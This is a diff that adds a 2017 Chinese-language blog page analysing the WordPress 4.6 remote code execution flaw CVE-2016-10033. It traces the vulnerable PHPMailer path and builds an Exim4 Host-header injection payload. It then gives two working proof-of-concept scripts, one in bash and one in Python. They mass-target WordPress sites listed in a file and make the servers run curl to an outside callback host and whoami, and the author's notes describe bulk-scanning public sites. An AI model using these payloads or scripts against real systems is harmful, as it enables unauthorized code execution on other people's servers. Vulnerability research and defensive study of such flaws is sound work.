@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="CVE-2016-10033早在2016年12月就已经曝出,漏洞成因为WordPress调用phpmail通过将代码注入到/usr/bin/sendmail变量中从而执行系统命令。而本次最新WordPress 4.6 RCE漏洞则是利用Host头插入Exim4 MTA向量来执行命令。"/>
+
+
+
+
+  <meta name="keywords" content="vuln, wordpress" />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="Bypass.World">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="http://yoursite.com/2017/05/WordPress-4-6-RCE-漏洞分析/"/>
+
+
+<meta name="description" content="CVE-2016-10033早在2016年12月就已经曝出,漏洞成因为WordPress调用phpmail通过将代码注入到/usr/bin/sendmail变量中从而执行系统命令。而本次最新WordPress 4.6 RCE漏洞则是利用Host头插入Exim4 MTA向量来执行命令。">
+<meta name="keywords" content="vuln, wordpress">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WordPress 4.6 RCE 漏洞分析">
+<meta property="og:url" content="http://yoursite.com/2017/05/WordPress-4-6-RCE-漏洞分析/index.html">
+<meta property="og:site_name" content="Bypass.World">
+<meta property="og:description" content="CVE-2016-10033早在2016年12月就已经曝出,漏洞成因为WordPress调用phpmail通过将代码注入到/usr/bin/sendmail变量中从而执行系统命令。而本次最新WordPress 4.6 RCE漏洞则是利用Host头插入Exim4 MTA向量来执行命令。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/05/590c8ca122a7c.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/05/590c8dc39b1b0.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/05/590c8fd7be004.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/05/590c93c4be133.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/05/590c9b19006bb.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/06/590cb14d304e8.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/06/590cb90b53d15.png">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/05/06/590ca71f619d5.png">
+<meta property="og:updated_time" content="2017-09-19T17:19:57.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WordPress 4.6 RCE 漏洞分析">
+<meta name="twitter:description" content="CVE-2016-10033早在2016年12月就已经曝出,漏洞成因为WordPress调用phpmail通过将代码注入到/usr/bin/sendmail变量中从而执行系统命令。而本次最新WordPress 4.6 RCE漏洞则是利用Host头插入Exim4 MTA向量来执行命令。">
+<meta name="twitter:image" content="https://ooo.0o0.ooo/2017/05/05/590c8ca122a7c.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?686eedfda259ce1d887831c94f49f99f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  <script type="text/javascript">
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+        ga('create', 'UA-106734017-1', 'auto');
+        ga('send', 'pageview');
+  </script>
+
+
+
+    <title> WordPress 4.6 RCE 漏洞分析 - Bypass.World </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">Bypass.World</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          WordPress 4.6 RCE 漏洞分析
+        
+      </h1>
+
+      <time class="post-time">
+          May 6 2017
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>漏洞编号:<code>CVE-2016-10033</code><br>影响版本:<code>WordPress 4.6</code><br>该漏洞早在2016年12月就已经曝出,漏洞成因为WordPress调用phpmail<br>通过将代码注入到<code>/usr/bin/sendmail</code>变量中从而执行系统命令。而本次最新WordPress 4.6 RCE漏洞则是利用Host头插入Exim4 MTA向量来执行命令。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="1、php-mail-历史漏洞"><a href="#1、php-mail-历史漏洞" class="headerlink" title="1、php mail()历史漏洞"></a>1、php mail()历史漏洞</h4><p>首先我们回顾下phpmail去年12月份曝出的漏洞,phpmail通过其内置mail()函数来发送邮件，其中mail()函数结构如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"># php --rf mail</div><div class="line"></div><div class="line">Function [ &lt;internal:standard&gt; function mail ] &#123;</div><div class="line"></div><div class="line">  - Parameters [5] &#123;</div><div class="line">    Parameter #0 [ &lt;required&gt; $to ]</div><div class="line">    Parameter #1 [ &lt;required&gt; $subject ]</div><div class="line">    Parameter #2 [ &lt;required&gt; $message ]</div><div class="line">    Parameter #3 [ &lt;optional&gt; $additional_headers ]</div><div class="line">    Parameter #4 [ &lt;optional&gt; $additional_parameters ]</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>其中第5个参数<code>$additional_parameters</code>允许在linux的/usr/bin/sendmail中注入额外的参数。许多Web应用程序使用该参数来设置包含发件人地址/返回路径的参数，如:<br><code>-f email@server-address.com</code><br><code>-r email@server-address.com</code><br>通常mail()函数执行如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$to      = <span class="string">"john@localhost"</span>;</div><div class="line">	$subject = <span class="string">"Simple Email"</span>;</div><div class="line">	$headers = <span class="string">"From: mike@localhost"</span>;</div><div class="line">	$body    = <span class="string">'Body of the message'</span>;</div><div class="line">	$sender  = <span class="string">"admin@localhost"</span>;</div><div class="line">	mail($to, $subject, $body, $headers, <span class="string">"-f $sender"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>PHP则会执行execve()来调用系统/usr/bin/sendmail程序:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">execve(<span class="string">"/bin/sh"</span>, </div><div class="line">       [<span class="string">"sh"</span>, <span class="string">"-c"</span>, <span class="string">"/usr/sbin/sendmail -t -i  -f admin@localhost"</span>],</div><div class="line">       [<span class="comment">/* 24 environment vars */</span>])</div></pre></td></tr></table></figure></p>
+<p>因此当$additional_parameters参数过滤不严导致代码被注入到sendmail中后将能直接执行系统命令。  </p>
+<blockquote>
+<p>关于更多的phpmail RCE漏洞参考如下链接：<br><a href="https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html" target="_blank" rel="external">https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html</a></p>
+</blockquote>
+<h4 id="2、WordPress-4-6-RCE-漏洞分析"><a href="#2、WordPress-4-6-RCE-漏洞分析" class="headerlink" title="2、WordPress 4.6 RCE 漏洞分析"></a>2、WordPress 4.6 RCE 漏洞分析</h4><p>本次漏洞入口点为<code>http://wordpress/wp-login.php?action=lostpassword</code>的HTTP Header的Host字段。该页面为找回管理员密码功能。<br>首先我们定位<code>/wp-login.php</code>的lostpassword函数，<br>接着进入retrieve_password函数，在#380行调用wp_mail()函数如下:<br><img src="https://ooo.0o0.ooo/2017/05/05/590c8ca122a7c.png" alt="1.png"><br>在<code>/wp-includes/pluggable.php</code>中查看wp-mail()函数，#324行发现WordPress提取<code>_SERVER[&#39;SERVER_NAME&#39;]</code>作为发件人的域并拼接后传递到$form_email变量。</p>
+<blockquote>
+<p>ps:记住这个$from_email变量,下文会用到。</p>
+</blockquote>
+<p><img src="https://ooo.0o0.ooo/2017/05/05/590c8dc39b1b0.png" alt="2.png"><br>之后在#471行将参数传递到Send()函数:<br><img src="https://ooo.0o0.ooo/2017/05/05/590c8fd7be004.png" alt="3.png"><br>在<code>/wp-includes/class-phpmailer</code>中跟踪到Send()跳转到postSend()函数并最终到#1344行mailSend()函数，如下:<br><img src="https://ooo.0o0.ooo/2017/05/05/590c93c4be133.png" alt="4.png"><br>我们看到如下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender)) &#123;</div><div class="line">    $params = <span class="string">' '</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $params = sprintf(<span class="string">'-f%s'</span>, <span class="keyword">$this</span>-&gt;Sender);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>该代码将我们看到Sender处理后传递到$params中,在#1364行并连同其他四个参数一同传递到mailPassthru()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$result = <span class="keyword">$this</span>-&gt;mailPassthru($toAddr, <span class="keyword">$this</span>-&gt;Subject, $body, $header, $params);</div></pre></td></tr></table></figure></p>
+<p>而Sender参数就是我们前面分析的$from_email参数传递过来的。<br>接上一步到#666行继续跟踪mailPassthru()函数：<br><img src="https://ooo.0o0.ooo/2017/05/05/590c9b19006bb.png" alt="5.png"><br>注意到如下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (ini_get(<span class="string">'safe_mode'</span>) || !(<span class="keyword">$this</span>-&gt;UseSendmailOptions)) &#123;</div><div class="line">    $result = @mail($to, $subject, $body, $header);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $result = @mail($to, $subject, $body, $header, $params);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>其中if语句中<code>ini_get(&#39;safe_mode&#39;)</code>为php.ini的安全模式默认为off,<code>UseSendmailOptions</code>为phpmail参数，在<code>/wp-includes/class-phpmailer.php</code>#176行可以看到默认为true。因此条件为flase并将第5个参数$params带入到@mail()函数。</p>
+<p>此时回过头来再看前面提到的<code>php mail()函数存在的历史漏洞</code>,是不是成功的把第5个参数传递到mail()函数中了呢。</p>
+<h4 id="3、WordPress-4-6-RCE-漏洞利用"><a href="#3、WordPress-4-6-RCE-漏洞利用" class="headerlink" title="3、WordPress 4.6 RCE 漏洞利用"></a>3、WordPress 4.6 RCE 漏洞利用</h4><p>通过前面的分析，我们来看看当进行一次下面的请求时系统执行的@mail()函数是怎么执行的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1</div><div class="line">Host: xxxxxx</div><div class="line"></div><div class="line">user_login=admin&amp;wp-submit=Get+New+Password</div></pre></td></tr></table></figure></p>
+<p>结合前面的分析，此时将会执行下面的代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">execve(<span class="string">"/bin/sh"</span>, </div><div class="line">    [<span class="string">"sh"</span>, <span class="string">"-c"</span>, <span class="string">"/usr/sbin/sendmail -t -i -f xxxxxx"</span>],</div><div class="line">    [<span class="comment">/* 24 environment vars */</span>])</div></pre></td></tr></table></figure></p>
+<p>那我们令Host为<code>xx command oo</code><br>是不是就能执行<code>/usr/sbin/sendmail -t -i -f xx command oo</code>了呢？<br>当然不是的。WordPress和phpmailer在host的域传入$from_email之前就已经做过了过滤。<br>@dawid_golunski在<br><a href="https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html" target="_blank" rel="external">https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html</a><br>中提到了解决方案，利用<a href="https://tools.ietf.org/html/rfc3696" target="_blank" rel="external">RFC 3696 规范</a>和 <a href="https://www.ietf.org/rfc/rfc0822.txt" target="_blank" rel="external">RFC 822 规范</a>，提到邮件地址能够利用圆括号加入注释如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">john@example.com(comment comment)</div></pre></td></tr></table></figure>
+<p>其中注释中能够包含空格，并能够成功注入到$from_email中。</p>
+<p>到此我们只需要考虑注入的内容，传统的sendmail利用MTA向量执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-OQueueDirectory=/tmp/ -X/var/www/html/backdoor.php</div></pre></td></tr></table></figure></p>
+<p>来写入后门，但这种方法一来Sendmail MTA现在已经很少出现在linux发行版中，二来代码中出现了大写字母在传入<code>_SERVER[&#39;SERVER_NAME&#39;]</code>的时候就已经被转换成了小写不能成功执行。</p>
+<p>@dawid_golunski在 <a href="https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html" target="_blank" rel="external">https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html</a> 中提到利用<code>Exim4 MTA</code>向量来执行代码,其格式如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sendmail -be <span class="string">'$&#123;run&#123;/usr/bin/curl http://baidu.com&#125;&#125;'</span></div></pre></td></tr></table></figure></p>
+<p>当然我们在将其通过Host传递到@mail()之前,还需要处理一下特殊字符，<br>如<code>&#39; &#39;,&#39;/&#39;,&#39;:&#39;</code>等特殊字符，不然路上就被WordPress和PhpMail过滤了。<br>我们可以通过exim的系统变量来提取特殊字符，这里列举两个如下：</p>
+<table>
+<thead>
+<tr>
+<th>var</th>
+<th>value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>$spool_directory</td>
+<td>/var/spool/exim4</td>
+</tr>
+<tr>
+<td>$tod_log</td>
+<td>2017-05-05 16:54:51</td>
+</tr>
+</tbody>
+</table>
+<p>利用substr提取特殊字符如下:<br><img src="https://ooo.0o0.ooo/2017/05/06/590cb14d304e8.png" alt="6.png"></p>
+<p>至此我们来构造一下Host为：<br><code>Host: xx(null -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}curl${substr{10}{1}{$tod_log}}http${substr{13}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}${substr{0}{1}{$spool_directory}}baidu.com}} null)</code><br>该代码用来执行<code>curl http://baidu.com</code> 当然你可以把url换成你自己的ip用来验证漏洞是否存在，或者用<a href="http://ceye.io/" target="_blank" rel="external">CEYE Platform</a>来进行测试。</p>
+<h4 id="3、POC-1"><a href="#3、POC-1" class="headerlink" title="3、POC_1"></a>3、POC_1</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"Usage: <span class="variable">$0</span> url_file"</span></div><div class="line"><span class="keyword">while</span> <span class="built_in">read</span> target</div><div class="line"><span class="keyword">do</span></div><div class="line">	<span class="built_in">echo</span> <span class="variable">$target</span></div><div class="line">	host_header=<span class="string">'asdf(xx -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;usr$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;curl$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;http$&#123;substr&#123;13&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;n8nfy9.ceye.io$&#123;substr&#123;13&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;80$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;$&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;usr$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;whoami&#125;&#125;&#125;&#125; null)'</span></div><div class="line">	<span class="comment">#记得将n8nfy9.ceye.io换成你回连的url</span></div><div class="line">	curl -H<span class="string">"Host: <span class="variable">$host_header</span>"</span> -s -d <span class="string">'user_login=admin&amp;wp-submit=Get+New+Password'</span> <span class="variable">$target</span>/wp-login.php?action=lostpassword --connect-timeout 10 -m 10</div><div class="line"><span class="keyword">done</span> &lt; <span class="variable">$1</span></div></pre></td></tr></table></figure>
+<h4 id="4、POC-2"><a href="#4、POC-2" class="headerlink" title="4、POC_2"></a>4、POC_2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool,Manager</div><div class="line"></div><div class="line">socket.setdefaulttimeout(<span class="number">20</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ss</span><span class="params">(_url,l,n)</span>:</span></div><div class="line">	url=_url+<span class="string">"/wp-login.php?action=lostpassword"</span></div><div class="line">	cmd=<span class="string">'$&#123;run&#123;/usr/bin/curl http://n8nfy9.ceye.io/'</span>+urllib.splittype(_url)[<span class="number">1</span>].strip(<span class="string">'/'</span>)+<span class="string">'&#125;&#125;'</span></div><div class="line">	cmd=cmd.replace(<span class="string">' '</span>,<span class="string">'$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;'</span>).replace(<span class="string">'/'</span>,<span class="string">'$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;'</span>).replace(<span class="string">':'</span>,<span class="string">'$&#123;substr&#123;13&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;'</span>)</div><div class="line">	header=&#123;<span class="string">"Host"</span>:<span class="string">"xenial(tmp1 -be "</span>+cmd+<span class="string">" tmp2)"</span>,<span class="string">"Accept"</span>:<span class="string">"*/*"</span>&#125;</div><div class="line">	data=urllib.urlencode(&#123;<span class="string">"user_login"</span>:<span class="string">"admin"</span>,<span class="string">"wp-submit"</span>:<span class="string">"Get+New+Password"</span>&#125;)</div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		proxy_handler=urllib2.ProxyHandler(&#123;<span class="string">'http'</span>:<span class="string">'http://127.0.0.1:8080'</span>&#125;)</div><div class="line">		opener=urllib2.build_opener(proxy_handler)</div><div class="line">		<span class="comment">#urllib2.install_opener(opener)</span></div><div class="line">		req=urllib2.Request(url,data=data,headers=header)</div><div class="line">		urllib2.urlopen(req)</div><div class="line">	<span class="keyword">except</span>:</div><div class="line">		<span class="keyword">pass</span></div><div class="line">	<span class="keyword">finally</span>:</div><div class="line">		sys.stdout.write(str(n)+<span class="string">"/"</span>+str(l)+<span class="string">" "</span>*<span class="number">20</span>+_url.strip()+<span class="string">' '</span>*<span class="number">50</span> + <span class="string">'\r'</span>)</div><div class="line">		sys.stdout.flush()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</div><div class="line">	print(<span class="string">"Usage: "</span>+sys.argv[<span class="number">0</span>]+<span class="string">" url_file"</span>)</div><div class="line">	t1=time.time()</div><div class="line">	print(<span class="string">'#'</span>*<span class="number">30</span>+<span class="string">' start time:'</span>+time.ctime())</div><div class="line">	pool = Pool(processes = <span class="number">8</span>)</div><div class="line">	a=open(sys.argv[<span class="number">1</span>]).readlines()</div><div class="line">	l=len(a)+<span class="number">1</span></div><div class="line">	n=<span class="number">1</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> a:</div><div class="line">		pool.apply_async(ss,args=(i.strip(),l,n))</div><div class="line">		n+=<span class="number">1</span></div><div class="line">	pool.close()</div><div class="line">	pool.join()</div><div class="line">	print(<span class="string">'#'</span>*<span class="number">30</span>+<span class="string">' end time:'</span>+time.ctime())</div><div class="line">	print(<span class="string">"use %s sec"</span>%(time.time()-t1))</div></pre></td></tr></table></figure>
+<p>如下用ceye测试存在漏洞的两个回显，其中一个内网一个公网。<br><img src="https://ooo.0o0.ooo/2017/05/06/590cb90b53d15.png" alt="7.png"></p>
+<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><blockquote>
+<p>OS    :       linux(kali)<br>Server:       Apache/2.4.23 (Debian)<br>PHP   :       v7.0.9-2<br>webapp:       WordPress 4.6<br>Ext:            Exim 4.87</p>
+</blockquote>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html" target="_blank" rel="external">https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html</a><br><a href="https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html" target="_blank" rel="external">https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html</a><br><a href="http://bobao.360.cn/news/detail/4146.html" target="_blank" rel="external">http://bobao.360.cn/news/detail/4146.html</a>  </p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>测试过程中踩的几个坑，记录如下：</p>
+<h4 id="1、host中特殊字符问题"><a href="#1、host中特殊字符问题" class="headerlink" title="1、host中特殊字符问题"></a>1、host中特殊字符问题</h4><blockquote>
+<p>前面提到传入的变量要把空格和斜杠替换，我在测试过程中用的curl进行证明漏洞存在，一直不成功，后来才注意到<code>http://xx.xx/</code>这种含有冒号的也要将冒号替换成<code>${substr{13}{1}{$tod_log}}</code>。如果换成包含其他特殊字符的代码，也需要用exim的系统变量进行转换下。</p>
+</blockquote>
+<h4 id="2、超时问题"><a href="#2、超时问题" class="headerlink" title="2、超时问题"></a>2、超时问题</h4><blockquote>
+<p>这个在大批量测试公网的wordpress漏洞时,跑的都是国外的url，受网络限制连接比较慢，并且host中这么长一大串，连接过程中Web服务器、防护设备都会进行层次检测，需要设置尽量长的超时，最好10s以上，不然测试很难成功。</p>
+</blockquote>
+<h4 id="3、WordPress版本问题"><a href="#3、WordPress版本问题" class="headerlink" title="3、WordPress版本问题"></a>3、WordPress版本问题</h4><blockquote>
+<p>我在本地部署wp测试的时候，测试了4.5.8、4.6、4.6.1、4.6.5四个版本，只有4.6版本能成功。</p>
+</blockquote>
+<h4 id="4、curl和urllib问题"><a href="#4、curl和urllib问题" class="headerlink" title="4、curl和urllib问题"></a>4、curl和urllib问题</h4><blockquote>
+<p>最开始写poc的时候是用python写的，无数次的失败测试后,才发现在bash中用curl竟然能成功，抓包后对比发现两种情况下的数据包如下：<br><img src="https://ooo.0o0.ooo/2017/05/06/590ca71f619d5.png" alt="0.png"><br>左边是在bash中执行curl的包，右边是python中用urllib2的包。对比发现原因是urllib2的header中少了<code>Accept: */*</code>字段。查看资料后才发现Accept代表客户端希望接受的数据类型，而在urllib2的包中只有Accept-Encoding,声明客户端支持的编码类型。直接修改python的poc，在header中加入<code>{&quot;Accept&quot;:&quot;*/*&quot;}</code>即可。</p>
+</blockquote>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+		<div class="post-tags">
+		  
+			<a href="/tags/vuln/">vuln</a>
+		  
+			<a href="/tags/wordpress/">wordpress</a>
+		  
+		</div>
+		
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2017/05/Python-Tips/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">Python Tips</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2017/04/office最新漏洞利用-CVE-2017-0199/">
+        <span class="next-text nav-default">office最新漏洞利用(CVE-2017-0199)</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2014 -
+    
+    2017
+    <span class="footer-author">Norman.Chew.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
